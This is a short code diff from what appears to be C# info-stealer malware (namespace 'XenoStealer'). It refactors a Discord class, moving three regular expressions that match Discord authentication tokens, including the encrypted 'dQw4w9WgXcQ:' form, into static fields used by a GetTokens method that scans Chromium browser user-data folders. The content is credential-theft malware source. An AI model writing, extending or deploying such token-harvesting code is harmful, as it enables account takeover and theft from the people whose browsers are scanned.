@@ -14,13 +14,13 @@ namespace XenoStealer.DataExtraction.Applications
 {
     public class Discord
     {
+        private static Regex BasicRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
+        private static Regex NewRegex = new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
+        private static Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);
+
         public static DiscordUserData[] GetTokens() 
         {
             HashSet<string> tokens = new HashSet<string>();
-
-            Regex BasicRegex = new Regex(@"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
-            Regex NewRegex = new Regex(@"mfa\.[\w-]{84}", RegexOptions.Compiled);
-            Regex EncryptedRegex = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)", RegexOptions.Compiled);
 
             foreach (string userData in Configuration.ChromiumBrowsers.Values)
             {
